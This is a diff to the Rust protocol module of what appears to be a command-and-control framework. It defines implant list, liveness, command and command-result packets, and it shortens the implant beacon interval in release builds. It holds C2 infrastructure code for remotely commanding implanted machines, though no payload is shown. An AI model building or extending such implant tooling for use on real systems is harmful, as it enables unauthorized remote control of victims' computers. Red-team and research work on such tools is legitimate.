@@ -1,18 +1,10 @@
-use std::{
-    io::Read,
-    net::TcpStream,
-    ops::Range,
-    time::{Duration, SystemTime},
-};
+use std::{io::Read, net::TcpStream, ops::Range, time::SystemTime};
 
 use bincode::{Decode, Encode, config};
 use sysinfo::System;
 
-pub const IMPLANT_REPORT_RATE_SECONDS: Range<u64> = if cfg!(debug_assertions) {
-    1..10
-} else {
-    60 * 5..60 * 5
-};
+pub const IMPLANT_REPORT_RATE_SECONDS: Range<u64> =
+    if cfg!(debug_assertions) { 1..4 } else { 5..30 };
 
 pub const MAX_PACKET_SIZE_BYTES: usize = 1024;
 
@@ -25,9 +17,8 @@ pub enum Packet {
     ImplantListRequest,
     ImplantList(Vec<Implant>),
     C2Alive,
-    CommandPacket { implant_id: usize, command: String },
-    ImplantCommandPacket { command: String },
-    CommandResult { output: String, exit_code: i32 },
+    Command { implant_id: usize, command: String },
+    CommandResults { results: Vec<(String, i32)> },
     CommandList { commands: Vec<String> },
 }
 
@@ -54,9 +45,6 @@ pub enum PacketSerializationError {
 
 pub fn read_packet(connection: &mut TcpStream) -> Result<Packet, PacketDeserializationError> {
     let mut buf = vec![0; MAX_PACKET_SIZE_BYTES];
-    // connection
-    //     .set_read_timeout(Some(Duration::from_millis(500)))
-    //     .expect("failed to set read timeout");
     if connection.read(&mut buf).is_err() {
         return Err(PacketDeserializationError::Timeout);
     }
